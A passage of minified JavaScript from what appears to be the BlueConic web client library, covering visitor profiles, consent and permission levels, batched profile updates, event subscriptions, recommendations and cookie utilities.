            a.removeProfileProperty = function (a) {
              return b.remove(a);
            };
            return b;
          }
          function b(a) {
            var b = new m.PermissionHandler();
            a.getPlugins = function () {
              return b.getAll();
            };
            a.addPlugin = function (a) {
              return b.add(a);
            };
            a.removePlugin = function (a) {
              return b.remove(a);
            };
            return b;
          }
          m.propertyOptOutHandler = a(Y.prototype.permission.optout);
          m.propertyOptInHandler = a(Y.prototype.permission.optin);
          m.pluginOptInHandler = b(Y.prototype.permission.optin);
          m.pluginOptOutHandler = b(Y.prototype.permission.optout);
          u.prototype.permission = {};
          u.prototype.permission.level = {
            DO_NOT_TRACK: m.DO_NOT_TRACK,
            ANONYMOUS: m.ANONYMOUS,
            PERSONAL: m.PERSONAL
          };
        }
      };
      m.createAPI();
      var t = {
          SET: "SET",
          ADD: "ADD",
          INCREMENT: "INCREMENT",
          addQueue: {},
          setQueue: {},
          incrementQueue: {},
          callbackQueue: [],
          addSources: {},
          setSources: {},
          incrementSources: {},
          replaySources: {},
          getProfile: function (a, b) {
            var d = g.getNextRequestId();
            g.addBatchRequest(g.GET_PROFILE, null, d, this, function (d) {
              this._handleProfileResponse(d, !0);
              c.doCallback(a, b, q);
            });
          },
          _handleProfileResponse: function (a, b) {
            if (a && a.result) {
              var d = function (a, d) {
                  var e = m[a.result.permissionlevel];
                  m.permissionLevel = e;
                  var f = c.ensureArray(a.result.optinproperties);
                  m.propertyOptInHandler.set(f);
                  var h = c.ensureArray(a.result.optoutproperties);
                  m.propertyOptOutHandler.set(h);
                  var g = c.ensureArray(a.result.optinplugins);
                  m.pluginOptInHandler.set(g);
                  a = c.ensureArray(a.result.optoutplugins);
                  m.pluginOptOutHandler.set(a);
                  l && (d = "Profile object initialized" + ("\x3cbr\x3e-id : [" + d + "]") + ("\x3cbr\x3e-permission level : [" + e + "]") + ("\x3cbr\x3e-optin properties : [" + f + "]"), d += "\x3cbr\x3e-optout properties : [" + h + "]", d += "\x3cbr\x3e-optin plugins : [" + g + "]", d += "\x3cbr\x3e-optout plugins : [" + a + "]", c.logInfo(d));
                  b && w.publish(w.ON_READY, {
                    blueConicClient: v
                  });
                },
                e = a.profileId ? a.profileId : a.tempId ? a.tempId : a.result.id;
              q ? (function (a) {
                this._id = a;
              }.call(q, e), q.getId() && m.getLevel() || d.call(this, a, e)) : (q = new Ja(e), d.call(this, a, e));
              m.getLevel() !== m.DO_NOT_TRACK && q.deleteDntRefusedObjectives();
            }
          },
          deleteProfile: function (a, b) {
            var d = q.getPrivacyLegislation(),
              e = g.getNextRequestId();
            g.addBatchRequest(g.DELETE_PROFILE, null, e, this, function () {
              c.setBcSessionId(null);
              q = new Ja();
              m.permissionLevel = m.DO_NOT_TRACK;
              q._properties.privacy_legislation = d;
              l && c.logInfo("profile is deleted");
              c.doCallback(a, b);
            });
          },
          createProfile: function (a, b) {
            var d = g.getNextRequestId();
            g.addBatchRequest(g.CREATE_PROFILE, null, d, this, function (d) {
              q = null;
              t.clearQueue();
              this._handleProfileResponse(d, !1);
              l && c.logInfo("new profile is created");
              c.doCallback(a, b, q);
            });
          },
          clearQueue: function () {
            t.addQueue = {};
            t.setQueue = {};
            t.incrementQueue = {};
            t.addSources = {};
            t.setSources = {};
            t.incrementSources = {};
          },
          updateProfile: function (a, b) {
            if (za) b && t.callbackQueue.push({
              caller: a,
              onSuccessCallback: b
            });else {
              var d = function (a) {
                  for (var b in a) return !1;
                  return !0;
                },
                e = function (a, b) {
                  a === m.DO_NOT_TRACK && c.setBcSessionId(b.profileId);
                };
              m.isPermissionLevelChanged && m.previousPermissionLevel === m.DO_NOT_TRACK ? function () {
                m.isPermissionLevelChanged = !1;
                var d = g.getNextRequestId(),
                  h = {};
                h.level = c.ensureArray(m.permissionLevel);
                h.message = c.ensureArray(m.message);
                q && (q.getConsentedObjectives() && (h.consented_objectives = c.ensureArray(q.getConsentedObjectives())), q.getRefusedObjectives() && (h.refused_objectives = c.ensureArray(q.getRefusedObjectives())));
                c.setBcSessionId(null);
                g.addBatchRequest(g.SET_PERMISSION_LEVEL, h, d, this, function (d) {
                  e(m.getLevel() + "", d);
                  t.getProfile(this, function () {
                    if (q) for (var d = q.getPropertyNames(), e = 0; e < d.length; e++) {
                      var f = d[e],
                        h = t.replaySources[f];
                      q.setValues(f, q.getValues(f), h);
                    }
                    t.updateProfile(this, function () {
                      v.createEvent("PAGEVIEW", !1, this, function (d) {
                        w.publish(w.ON_PERMISSION_LEVEL_CHANGE, {
                          permissionLevel: m.permissionLevel,
                          previousPermissionLevel: m.previousPermissionLevel
                        });
                        c.doCallback(a, b);
                      });
                    });
                    g.submitBatch();
                  });
                  g.submitBatch();
                });
                g.submitBatch();
              }() : function () {
                function f(d) {
                  fa--;
                  if (0 === fa) {
                    if (t.callbackQueue && 0 < t.callbackQueue.length) {
                      for (var e = 0; e < t.callbackQueue.length; e++) c.doCallback(t.callbackQueue[e].caller, t.callbackQueue[e].onSuccessCallback);
                      t.callbackQueue = [];
                    }
                    d && d.result && (d.result.permissionlevel && "No profile present and will not be created." !== c.getBcSessionId(Ea) && (m.permissionLevel = m[d.result.permissionlevel]), vb && q && q.getPrivacyLegislation() && (d.result.consentedobjectives && (q._properties.consented_objectives = d.result.consentedobjectives), d.result.refusedobjectives && (q._properties.refused_objectives = d.result.refusedobjectives)));
                    c.doCallback(a, b);
                  }
                }
                var h = t.addQueue,
                  p = t.setQueue,
                  r = t.incrementQueue,
                  n = t.addSources,
                  z = t.setSources,
                  l = t.incrementSources;
                t.clearQueue();
                for (var k = c.getPropertiesFromObject(p), Na = 0, u = k.length; Na < u; Na++) delete h[k[Na]], delete r[k[Na]];
                var v = c.getPropertiesFromObject(h),
                  Ob = c.getPropertiesFromObject(r),
                  fa = 1;
                new Date().getTime();
                (function () {
                  if (m.isPermissionLevelChanged) {
                    var a = {};
                    fa++;
                    var b = m.getLevel() + "";
                    a.level = c.ensureArray(b);
                    a.message = c.ensureArray(m.message);
                    m.isPermissionLevelChanged = !1;
                    var d = g.getNextRequestId();
                    g.addBatchRequest(g.SET_PERMISSION_LEVEL, a, d, this, function (a) {
                      f.call(this);
                      e(b, a);
                      w.publish(w.ON_PERMISSION_LEVEL_CHANGE, {
                        permissionLevel: m.permissionLevel,
                        previousPermissionLevel: m.previousPermissionLevel
                      });
                    });
                  }
                })();
                (function () {
                  var a = m.pluginOptInHandler && m.pluginOptInHandler.getAddList(),
                    b = m.propertyOptInHandler && m.propertyOptInHandler.getAddList(),
                    c = {};
                  if (0 < a.length || 0 < b.length) fa++, c.properties = b, c.plugins = a, a = g.getNextRequestId(), g.addBatchRequest(g.ADD_OPTIN, c, a, this, f);
                })();
                (function () {
                  var a = m.pluginOptInHandler && m.pluginOptInHandler.getRemoveList(),
                    b = m.propertyOptInHandler && m.propertyOptInHandler.getRemoveList(),
                    c = {};
                  if (0 < a.length || 0 < b.length) fa++, c.properties = b, c.plugins = a, a = g.getNextRequestId(), g.addBatchRequest(g.REMOVE_OPTIN, c, a, this, f);
                })();
                (function () {
                  var a = m.pluginOptOutHandler && m.pluginOptOutHandler.getAddList(),
                    b = m.propertyOptOutHandler && m.propertyOptOutHandler.getAddList(),
                    c = {};
                  if (0 < a.length || 0 < b.length) fa++, c.properties = b, c.plugins = a, a = g.getNextRequestId(), g.addBatchRequest(g.ADD_OPTOUT, c, a, this, f);
                })();
                (function () {
                  var a = m.pluginOptOutHandler && m.pluginOptOutHandler.getRemoveList(),
                    b = m.propertyOptOutHandler && m.propertyOptOutHandler.getRemoveList(),
                    c = {};
                  if (0 < a.length || 0 < b.length) fa++, c.properties = b, c.plugins = a, a = g.getNextRequestId(), g.addBatchRequest(g.REMOVE_OPTOUT, c, a, this, f);
                })();
                (function () {
                  if (0 < k.length) {
                    var a = {};
                    a.properties = p;
                    d(z) || (a.sources = z);
                    fa++;
                    var b = g.getNextRequestId();
                    g.addBatchRequest(g.SET_PROPERTIES, a, b, this, f);
                  }
                })();
                (function () {
                  if (0 < v.length) {
                    var a = {};
                    a.properties = h;
                    d(n) || (a.sources = n);
                    fa++;
                    var b = g.getNextRequestId();
                    g.addBatchRequest(g.ADD_PROPERTIES, a, b, this, f);
                  }
                })();
                (function () {
                  if (0 < Ob.length) {
                    var a = {};
                    a.properties = r;
                    d(n) || (a.sources = l);
                    fa++;
                    var b = g.getNextRequestId();
                    g.addBatchRequest(g.INCREMENT_PROPERTIES, a, b, this, f);
                  }
                })();
                f();
                m.propertyOptOutHandler && m.propertyOptOutHandler.clear();
                m.propertyOptInHandler && m.propertyOptInHandler.clear();
                m.pluginOptInHandler && m.pluginOptInHandler.clear();
                m.pluginOptOutHandler && m.pluginOptOutHandler.clear();
              }();
            }
          },
          getProperties: function (a, b, d) {
            a = {
              property: a
            };
            var e = g.getNextRequestId();
            g.addBatchRequest(g.GET_PROPERTIES, a, e, this, function (a) {
              function e(a, b) {
                b = c.ensureArray(b);
                this._properties[a] = b;
              }
              if (a && a.result && a.result.properties) {
                a = a.result.properties;
                for (var f in a) {
                  var g = a[f];
                  g && "function" != typeof g && e.call(q, f, g);
                }
              }
              c.doCallback(b, d);
            });
          },
          unsavedLog: function (a, b, d, e, f) {
            var h;
            switch (d) {
              case t.SET:
                h = t.setQueue;
                break;
              case t.ADD:
                h = t.addQueue;
                break;
              case t.INCREMENT:
                h = t.incrementQueue;
                break;
              default:
                h = t.setQueue;
            }
            d === t.SET && (delete t.addQueue[a], delete t.setQueue[a], delete t.incrementQueue[a]);
            h[a] || (h[a] = []);
            h = h[a];
            var g = function () {
              if (e && f) {
                var b = null;
                d === t.SET ? b = t.setSources : d === t.ADD ? b = t.addSources : d === t.INCREMENT && (b = t.incrementSources);
                b && (b[f] || (b[f] = []), -1 === v.util.array.indexOfArray(b[f], a) && b[f].push(a));
                t.replaySources[a] = f;
              }
            };
            if (c.isArray(b)) {
              for (var r = b.length, n = 0; n < r; n++) y.call(h, b[n]);
              g();
            } else null !== b && b !== E ? (y.call(h, b), g()) : h = null;
          }
        },
        fb = {
          createEvent: function (a, b, d, e) {
            var f = g.getNextRequestId();
            a = this.getParams(a, b, d);
            g.addBatchRequest(g.CREATE_TIMELINE_EVENT, a, f, d, function (a) {
              a && a.result ? c.doCallback(d, e, "true" === a.error ? new TypeError("Event is not added due to validation errors or invalid event type.") : a.result) : c.doCallback(d, e, null);
            });
            g.submitBatch();
          },
          getParams: function (a, b, d) {
            var e = null;
            if (b.data && b.data instanceof Object && !c.isArray(b.data)) for (var e = v.json.parse(v.json.stringify(b.data)), f = c.getPropertiesFromObject(e), h = 0; h < f.length; h++) {
              var g = f[h];
              e[g] = c.ensureArray(e[g]);
              if (0 < e[g].length && e[g][0] instanceof Object && !c.isDate(e[g][0])) for (var r = 0; r < e[g].length; r++) {
                var n = e[g][r];
                if (n) for (var z = c.getPropertiesFromObject(n), l = 0; l < z.length; l++) {
                  var k = z[l];
                  n[k] = c.ensureArray(n[k]);
                }
              }
            }
            f = null;
            d && d.context && d.context.getInteractionId && (f = d.context.getInteractionId());
            a = {
              referrer: c.ensureArray(b.referrer),
              profile: c.ensureArray(b.profile),
              type: c.ensureArray(a),
              eventSource: c.ensureArray(f)
            };
            e && (a.data = c.ensureArray(v.json.stringify(e)));
            b.eventId && (a.eventId = c.ensureArray(b.eventId));
            b.timestamp && (a.timestamp = c.ensureArray(b.timestamp.getTime()));
            return a;
          }
        },
        w = {
          types: ["PAGEVIEW", "VIEW", "CLICK", "CONVERSION"],
          dynamicTypes: [],
          eventQueue: [],
          handlersByEvent: {},
          ON_PERMISSION_LEVEL_CHANGE: "onpermissionlevelchange",
          ON_READY: "onready",
          ON_EVENT_READY: "oneventready",
          ON_URL_CHANGE: "onurlchange",
          ON_BEFORE_PRELISTENERS: "onbeforeprelisteners",
          ON_BEFORE_INTERACTIONS: "onbeforeinteractions",
          ON_SEGMENT_CHANGE: "onsegmentchange",
          ON_LIFECYCLE_STAGE_CHANGE: "onlifecyclestagechange",
          publish: function (a, b) {
            if (a && "string" == typeof a) {
              var d = {};
              d.name = a.toLowerCase();
              d.context = b;
              w.eventQueue.push(d);
              l && c.logInfo("published event : [" + a + "]");
              w.handleEvent(d);
            }
          },
          unsubscribe: function (a) {
            for (var b = c.getPropertiesFromObject(w.handlersByEvent), d = 0; d < b.length; d++) {
              var e = w.handlersByEvent[b[d]],
                e = e ? e : [];
              w.handlersByEvent[b[d]] = e;
              for (var f = e.length - 1; 0 <= f; f--) {
                var h = e[f].handlerObject.ctx;
                (h.isLocalEditMode() ? h.getInteractionTypeId().substring(11) : h.getInteractionTypeId()) === a && c.removeItemFromArray(e, e[f]);
              }
            }
          },
          subscribe: function (a, b, d) {
            if (a && "string" == typeof a && d && "function" == typeof d) {
              a = a.toLowerCase();
              var e = w.handlersByEvent[a],
                e = e ? e : [];
              w.handlersByEvent[a] = e;
              var f = {};
              f.handlerObject = b;
              f.handlerFunction = d;
              e.push(f);
              l && c.logInfo("subscribing to event: [" + a + "]");
              w.handleQueuedEvents(a, f);
            }
          },
          handleQueuedEvents: function (a, b) {
            for (var d = [], e = 0; e < w.eventQueue.length; e++) {
              var f = w.eventQueue[e];
              f.name == a && (c.doCallback(b.handlerObject, b.handlerFunction, a, f.context), d.push(f));
            }
            for (a = 0; a < d.length; a++) c.removeItemFromArray(w.eventQueue, d[a]);
          },
          handleEvent: function (a) {
            if (a && a.name) for (var b = a.name.toLowerCase(), d = w.handlersByEvent[b], d = d ? d : [], e = 0; e < d.length; e++) {
              var f = d[e];
              c.doCallback(f.handlerObject, f.handlerFunction, b, a.context);
            }
          },
          create: function (a, b, d) {
            var e = g.getNextRequestId(),
              f = {
                type: c.ensureArray(a.type),
                referrer: c.ensureArray(a.referrer),
                profile: c.ensureArray(a.profile)
              };
            a.interaction ? f.interaction = c.ensureArray(a.interaction) : a.timelineContext && (f.timelineContext = a.timelineContext, f.timestamp = a.timestamp, f.eventSource = a.eventSource);
            a.losingInteractions && (f.losingInteractions = c.ensureArray(a.losingInteractions));
            g.addBatchRequest(g.CREATE_EVENT, f, e, this, function (a) {
              function e(a) {
                a = c.ensureArray(a);
                for (var b = a.length, d = 0; d < b; d++) {
                  var e = a[d];
                  e && (e = Bb(e), y.call(f, e));
                }
              }
              if (a && a.result) {
                a = a.result;
                var f = [];
                a.interactions && e(a.interactions);
                a.loggedIn && "true" === a.loggedIn && (l = !0);
                a.channelId && (rb = a.channelId);
                a.ipaddress && (sb = a.ipaddress);
                if (a.interactionnames) {
                  for (var h = [], g = 0; g < K.length; g++) h.push(K[g].id);
                  for (g = 0; g < a.interactionnames.length; g++) -1 === c.indexOfArray(h, a.interactionnames[g].id) && K.push(a.interactionnames[g]);
                }
                if (a.objectives) for (null === ka && (ka = {}), h = 0; h < a.objectives.length; h++) -1 === c.indexOfArray(ka, a.objectives[h].id) && (g = a.objectives[h].myId, ka[g] = new Ib(g, a.objectives[h].myName, a.objectives[h].myDescription));
                if (a.connections) {
                  h = [];
                  for (g = 0; g < V.length; g++) h.push(V[g].id);
                  for (g = 0; g < a.connections.length; g++) {
                    var k = a.connections[g],
                      m = c.indexOfArray(h, k.id);
                    -1 === m ? V.push(k) : V[m] = k;
                  }
                }
                if (a.goals) for (null === wa && (wa = {}), h = c.getPropertiesFromObject(a.goals), g = 0; g < h.length; g++) k = h[g], a.goals[k] && (m = c.ensureArray(a.goals[k]), wa[k] = m.map(function (a) {
                  return new Jb(a);
                }));
                if (a.lifecycleStages) {
                  h = [];
                  W && 0 < W.length && W.map && (h = W.map(function (a) {
                    return a.getLifecycle().getId() + "_" + a.getStage().getId();
                  }));
                  W = [];
                  if (0 < a.lifecycleStages.length) for (g = 0; g < a.lifecycleStages.length; g++) m = a.lifecycleStages[g], k = new Kb(m.myLifecycleId, m.myLifecycleName ? m.myLifecycleName : ""), m = new Lb(m.myStageId, m.myStageName ? m.myStageName : ""), W.push(new Mb(k, m));
                  null !== h && (g = W.map(function (a) {
                    return a.getLifecycle().getId() + "_" + a.getStage().getId();
                  }), g.sort().join(",") !== h.sort().join(",") && w.publish(w.ON_LIFECYCLE_STAGE_CHANGE, {
                    old: h,
                    new: g
                  }));
                }
                a.segments && (h = null, ja && 0 < ja.length && ja.map && (h = ja.map(function (a) {
                  return a.id;
                })), ja = a.segments, null !== h && (g = ja.map(function (a) {
                  return a.id;
                }), g.sort().join(",") !== h.sort().join(",") && w.publish(w.ON_SEGMENT_CHANGE, {
                  old: h,
                  new: g
                })));
                a.pluginversion && (Ka = a.pluginversion);
                a.libraryversion && (La = a.libraryversion);
                a.templatesversion && (Oa = a.templatesversion);
                a.simulatordate && (Xa = new Date(a.simulatordate));
                a.eventtypes && (h = c.ensureArray(a.eventtypes), w.dynamicTypes = w.dynamicTypes.concat(h));
                a.selectedlegislations && (Ua = a.selectedlegislations);
                a.legislation && (q._properties.privacy_legislation = a.legislation);
                a.consentedobjectives && (q._properties.consented_objectives = a.consentedobjectives);
                a.refusedobjectives && (q._properties.refused_objectives = a.refusedobjectives);
                c.doCallback(b, d, f);
              } else c.doCallback(b, d, null);
            });
          }
        };
      u.prototype.event = {
        publish: function (a, b) {
          w.publish(a, b);
        },
        subscribe: function (a, b, c) {
          w.subscribe(a, b, c);
        },
        unsubscribe: function (a) {
          w.unsubscribe(a);
        },
        onProfilePermissionChange: w.ON_PERMISSION_LEVEL_CHANGE,
        onReady: w.ON_READY,
        onEventReady: w.ON_EVENT_READY,
        onUrlChange: w.ON_URL_CHANGE,
        onBeforePreListeners: w.ON_BEFORE_PRELISTENERS,
        onBeforeInteractions: w.ON_BEFORE_INTERACTIONS,
        onSegmentChange: w.ON_SEGMENT_CHANGE,
        onLifecycleStageChange: w.ON_LIFECYCLE_STAGE_CHANGE
      };
      var Cb = {
        getRecommendationsEndpoint: function (a, b) {
          var d = Q() + "/rest/v2/recommendations",
            e = c.getZoneId();
          e && (d += "/" + e);
          d += b ? "/" + b : "";
          a = a || {};
          b = c.getPropertiesFromObject(a);
          for (e = 0; e < b.length; e++) "request" === b[e] && "object" === typeof a[b[e]] && (a[b[e]] = v.json.stringify(a[b[e]]));
          a = c.objectToUrl(a);
          return d + (a ? "?" + a : "");
        },
        createEvent: function (a, b) {
          a = a || {};
          a.referer || (a.referer = k.location);
          g.JSONP.get(this.getRecommendationsEndpoint(a, "stats"), null, function (a) {
            b && c.doCallback(this, b, a);
          });
        },
        getRecommendations: function (a, b) {
          g.JSONP.get(this.getRecommendationsEndpoint(a), null, function (a) {
            a = new Gb(a);
            b && c.doCallback(this, b, a);
          });
        }
      };
      u.prototype.recommendation = {
        getRecommendations: function (a, b) {
          Cb.getRecommendations(a, b);
        },
        createEvent: function (a, b) {
          Cb.createEvent(a, b);
        }
      };
      var P = {
        selectors: [],
        handlersBySelector: {},
        handlerId: 0,
        publish: function (a) {
          a && "string" === typeof a && (l && c.logInfo("published position update event for selector : [" + a + "]"), P.handlePositionUpdateEvent(a));
        },
        subscribe: function (a, b, d) {
          if (!a || "string" !== typeof a) throw Error("Selector is empty or not of type string");
          if (!d || "function" != typeof d) throw Error("No callback function defined or not a function.");
          -1 === c.indexOfArray(this.selectors, a) && (c.isArray(a) ? this.selectors = this.selectors.concat(a) : this.selectors.push(a));
          var e = this.handlersBySelector[a],
            e = e ? e : [];
          P.handlersBySelector[a] = e;
          var f = {};
          f.id = ++this.handlerId;
          f.handlerObject = b;
          f.handlerFunction = d;
          e.push(f);
          l && c.logInfo("subscribing to position update event for selector: [" + a + "] with id [" + f.id + "]");
          return f.id;
        },
        unsubscribe: function (a) {
          if (!a || "number" !== typeof a) throw Error("Subscription id is empty or not of type number");
          for (var b = c.getPropertiesFromObject(this.handlersBySelector), d = 0; d < b.length; d++) {
            var e = b[d],
              f = this.handlersBySelector[e],
              f = f.filter(function (b) {
                b.id === a && l && c.logInfo("found handler with id: [" + a + "]");
                return b.id !== a;
              });
            0 === f.length ? (delete this.handlersBySelector[e], c.removeItemFromArray(this.selectors, e)) : this.handlersBySelector[e] = f;
          }
          l && c.logInfo("unsubscribing to position update event for id [" + a + "]");
        },
        handlePositionUpdateEvent: function (a) {
          if (a) {
            var b = P.handlersBySelector[a],
              b = b ? b : [];
            delete P.handlersBySelector[a];
            c.removeItemFromArray(this.selectors, a);
            for (var d = 0, e = b.length; d < e; d++) {
              var f = b[d];
              c.doCallback(f.handlerObject, f.handlerFunction, a);
            }
          }
        },
        getSelectors: function () {
          return this.selectors;
        }
      };
      u.prototype.position = {
        publish: function (a) {
          P.publish(a);
        },
        subscribe: function (a, b, c) {
          return P.subscribe(a, b, c);
        },
        unsubscribe: function (a) {
          P.unsubscribe(a);
        }
      };
      u.prototype.objective = {
        getObjectives: function () {
          return ka;
        },
        getObjectiveById: function (a) {
          return ka[a] ? ka[a] : null;
        }
      };
      var c = {
        docReadyCallbacks: [],
        rxhtmlTag: /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:]+)[^>]*)\/>/ig,
        hash: function (a) {
          for (var b = 0, c, e = 0; e < a.length; e++) c = a.charCodeAt(e), b = 31 * b + c, b &= b;
          for (e = a.length - 1; 0 <= e; e--) c = a.charCodeAt(e), b = 31 * b + c, b &= b;
          return b;
        },
        doCallback: function () {
          for (var a = arguments[0], b = arguments[1], d = [], e = 2, f = arguments.length; e < f; e++) y.call(d, arguments[e]);
          if (b && "function" == typeof b) if (l) b.apply(a, d);else try {
            b.apply(a, d);
          } catch (h) {
            c.logError("an error occured in callback function: [" + b + "], error: [" + h + "]");
          }
        },
        trimLeft: function (a) {
          if (a) return a.replace(/^\s+/, "");
        },
        trimRight: function (a) {
          if (a) return a.replace(/\s+$/, "");
        },
        map: function (a, b, c) {
          if (Xb) return a.map(function (a) {
            return b.call(c, a);
          });
          for (var d = 0, f = a.length, h = []; d < f; d++) d in a && (h[d] = b.call(c, a[d]));
          return h;
        },
        setContent: function (a, b) {
          if (a && b !== E && null !== b) {
            b = b.replace(c.rxhtmlTag, "\x3c$1\x3e\x3c/$2\x3e");
            var d = a.nodeName ? a.nodeName.toLowerCase() : a.nodeName;
            if (-1 !== c.indexOfArray("area base br col command embed hr img input keygen link meta param source track wbr".split(" "), d)) {
              var e = a.parentNode ? a.parentNode.innerHTML : null;
              if (e) {
                var f = document.createElement("div");
                f.appendChild(a.cloneNode(!0));
                b = e.replace(f.innerHTML, b);
                if (a.parentNode.innerHTML !== b) try {
                  a.parentNode.innerHTML = b, l && c.logInfo("setContent replaced void element [" + d + "] with given html");
                } catch (h) {
                  l && c.logInfo("setContent failed to replace void element [" + d + "] with given html");
                }
              } else l && c.logInfo("could not set inner html for void element [" + d + "] because container was not ready");
            } else {
              for (; a.firstChild;) a.removeChild(a.firstChild);
              try {
                a.innerHTML = b;
              } catch (h) {
                d = document.createElement(), d.innerHTML = b, a.appendChild(d);
              }
            }
          }
        },
        getBcTempId: function (a) {
          return c.getBcId("BCTempID", a);
        },
        setBcTempId: function (a, b, d) {
          c.setBcId("BCTempID", a, b, d);
        },
        getBcSessionId: function (a) {
          return c.getBcId("BCSessionID", a);
        },
        getBcId: function (a, b) {
          return b ? b[a] : c.getCookie(a);
        },
        setBcSessionId: function (a, b) {
          c.setBcId("BCSessionID", a, b);
        },
        setBcId: function (a, b, d, e) {
          var f = "BCSessionID" === a;
          f ? nb ? (c.setCookie(a, b, 0), c.setCookie(a, null, null, $a)) : (c.setCookie(a, null, null), c.setCookie(a, b, e, $a)) : c.setCookie(a, b, e);
          d && (b ? d[a] = b : delete d[a]);
          U && f && g.lastSyncedCookieId !== b && g.thirdPartyCookieId !== b && (g.lastSyncedCookieId = b, g.cookieSyncTimeoutHandle && clearTimeout(g.cookieSyncTimeoutHandle), g.cookieSyncTimeoutHandle = setTimeout(function () {
            g.JSONP.get(g.resourceURL_CST, {
              bcsessionid: b || ""
            }, function () {
              l && c.logInfo("CS update success: " + b);
            }, null, function () {
              g.lastSyncedCookieId = E;
              c.logWarning("CS request failed...");
            }, !1, !1);
          }, 0));
        },
        bcSessionIdChanged: function (a) {
          var b = c.getCookie("BCSessionID");
          return a !== b;
        },
        setCookie: function (a, b, d, e) {
          if (Fa && a) if (null === b || b === E) document.cookie = a + "\x3d;expires\x3dThu, 01 Jan 1970 00:00:00 GMT; path\x3d/" + (e ? ";domain\x3d" + e : "") + (I ? ";SameSite\x3dNone;Secure" : "");else {
            var f = new Date();
            null === d || d === E || isNaN(d) ? f.setDate(f.getDate() + 365) : f = 0 < d ? new Date(f.getTime() + parseInt(d)) : null;
            b && "string" == typeof b && (b = b.replace(/[\n\r]/g, ""));
            b = a + "\x3d" + encodeURIComponent(b);
            f && (b += ";expires\x3d" + f.toUTCString());
            e && (b += ";domain\x3d" + e);
            b += ";path\x3d/";
            I && (b += ";SameSite\x3dNone;Secure");
            e = document.cookie + b;
            -1 < a.indexOf("BCRevision") && 3E3 < e.length ? l && c.logInfo("could not set cookie [" + a + "] with size [" + b.length + "] because it would exceed the total cookie length of 3kb") : document.cookie = b;
          }
        },
        getCookies: function () {
          var a = null,
            b = 0,
            d = {};
          if (!Fa) return d;
          a = null !== ia && null === Ea ? ia : document.cookie;
          if (ia !== a) ia = a;else if (null !== Ea) return Ea;
          a && -1 < a.indexOf("$Version\x3d") && document.cookie.match(/^\s*\$Version=(?:"1"|1);\s*(.*)/) && (a = RegExp.$1, b = 1);
          0 === b ? c.map(a.split(/[,;]/), function (a) {
            a = a.split(/=/);
            var b = decodeURIComponent(c.trimLeft(a[0])),
              e = null;
            try {
              if (1 < a.length) for (var g = 1; g < a.length; g++) e = e ? e + a[g] : a[g], g < a.length - 1 && (e += encodeURIComponent("\x3d"));
              d[b] = e ? decodeURIComponent(c.trimRight(e)) : null;
            } catch (r) {}
          }) : c.map(a.match(/(?:^|\s+)([!#$%&'*+\-.0-9A-Z^`a-z|~]+)=([!#$%&'*+\-.0-9A-Z^`a-z|~]*|"(?:[\x20-\x7E\x80\xFF]|\\[\x00-\x7F])*")(?=\s*[,;]|$)/g), function (a, b) {
            b = '"' === b.charAt(0) ? b.substr(1, -1).replace(/\\(.)/g, "$1") : b;
            d[a] = b;
          });
          return Ea = d;
        },
        getCookie: function (a) {
          return c.getCookies()[a];
        },
        ensureArray: function (a) {
          if (c.isArray(a)) return a;
          var b = [];
          null !== a && a !== E && y.call(b, a);
          return b;
        },
        isArray: function (a) {
          return a ? Vb ? Array.isArray(a) : -1 == ob.call(a).indexOf("Array") ? !1 : !0 : !1;
        },
        isDate: function (a) {
          return a && -1 != ob.call(a).indexOf("Date") && a.getTime ? !0 : !1;
        },
        isObject: function (a) {
          return null !== a && "[object Object]" === Object.prototype.toString.call(a);
        },
        diffArrays: function (a, b) {
          if (Wb && pb) return a.filter(function (a) {
            return 0 > b.indexOf(a);
          });
          var c,
            e = a.slice();
          for (a = 0; a < e.length; a++) for (c = 0; c < b.length; c++) if (e[a] === b[c]) {
            e.splice(a, 1);
            a--;
            break;
          }
          return e;
        },
        removeItemFromArray: function (a, b) {
          if (c.isArray(a)) for (var d; -1 !== (d = c.indexOfArray(a, b));) a.splice(d, 1);
        },
        indexOfArray: function (a, b) {
          if (!a || !c.isArray(a)) return -1;
          if (pb) return a.indexOf(b);
          for (var d = 0, e = a.length; d < e; d++) if (a[d] === b) return d;
          return -1;
        },
        mergeArrays: function (a, b) {
          if (c.isArray(a) && b) if (c.isArray(b) || -1 == c.indexOfArray(a, b)) for (var d = 0, e = b.length; d < e; d++) {
            var f = b[d];
            -1 === c.indexOfArray(a, f) && y.call(a, f);
          } else y.call(a, b);
        },
        loadScript: function (a, b, d) {
          var e = document.createElement("script"),
            f = !1,
            g;
          e.src = a;
          e.async = !0;
          e.onload = e.onreadystatechange = function () {
            f || this.readyState && "loaded" !== this.readyState && "complete" !== this.readyState || (f = !0, e.onload = e.onreadystatechange = null, e && e.parentNode && e.parentNode.removeChild(e), c.doCallback(b, d));
          };
          g || (g = document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]);
          g.appendChild(e);
        },
        loadCSS: function (a) {
          c.loadCSS.urlMap || (c.loadCSS.urlMap = {});
          c.loadCSS.counter || (c.loadCSS.counter = 0);
          var b = c.loadCSS.urlMap,
            d = b[a];
          d || (b[a] = "id_" + ++c.loadCSS.counter);
          d = b[a];
          if (document.getElementById(d)) l && c.logInfo("skip loading css [" + a + "]");else {
            l && c.logInfo("start loading css [" + a + "]");
            var b = document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0],
              e = document.createElement("link");
            e.id = d;
            e.rel = "stylesheet";
            e.type = "text/css";
            e.href = a;
            b.appendChild(e);
          }
        },
        bindDocumentReady: function (a, b) {
          b && "function" == typeof b && (ga ? c.doCallback(a, b) : y.call(c.docReadyCallbacks, function () {
            c.doCallback(a, b);
          }));
        },
        docReady: function () {
          if (!ga) {
            ga = !0;
            l && c.logInfo("[+] document ready event thrown by browser");
            for (var a = c.docReadyCallbacks, b = a.length, d = 0; d < b; d++) a[d].apply();
          }
        },
        getInteractionParameters: function (a) {
          var b = {};
          if (a) {
            a = c.ensureArray(a.parameters);
            for (var d = 0, e = a.length; d < e; d++) {
              var f = a[d];
              if (f) {
                for (var g = {}, l = 0, r = f.parameter.length; l < r; l++) {
                  var n = f.parameter[l];
                  n && (g[n.id] = n.value);
                }
                b[f.locale] = g;
              }
            }
          }
          return b;
        },
        getPropertiesFromObject: function (a) {
          if (!a) return [];
          var b = [],
            c;
          for (c in a) ea.call(a, c) && "function" != typeof a[c] && y.call(b, c);
          return b;
        },
        getDOMElement: function (a, b) {
          if (!a) return null;
          "undefined" == typeof b && (b = c.isCSSSelector(a));
